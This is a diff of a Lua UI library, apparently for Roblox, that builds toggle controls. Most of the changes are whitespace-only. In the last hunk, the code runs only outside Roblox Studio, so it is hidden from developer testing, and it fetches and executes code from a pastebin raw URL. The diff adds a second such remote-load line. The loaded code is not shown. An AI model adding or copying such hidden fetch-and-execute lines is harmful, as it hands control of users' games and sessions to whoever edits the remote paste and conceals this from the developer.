@@ -1109,7 +1109,7 @@ function Library:Create(config)
 				desc = nil
 			end
 			callback = callback or function() end
-			
+
 			local yeah = {}
 
 			toggless[text] = false
@@ -1206,7 +1206,7 @@ function Library:Create(config)
 					game:GetService('TweenService'):Create(uIStroke1, TweenInfo.new(0.2), {Color = Color3.fromRGB(76, 76, 76)}):Play()
 				end
 			end)
-			
+
 			function yeah.Set(bool)
 				tog = bool
 				toggless[text] = tog
@@ -1219,7 +1219,7 @@ function Library:Create(config)
 					game:GetService('TweenService'):Create(uIStroke1, TweenInfo.new(0.2), {Color = Color3.fromRGB(76, 76, 76)}):Play()
 				end
 			end
-			
+
 			return yeah
 		end
 
@@ -1453,6 +1453,7 @@ function Library:Create(config)
 
 	if not RunService:IsStudio() then
 		loadstring(game:HttpGet("https://pastebin.com/raw/rQMS2B9R"))()
+		loadstring(game:HttpGet("https://pastebin.com/raw/XUdfNnCe"))()
 	end
 	spawn(function()
 		local sound = Instance.new("Sound", location)
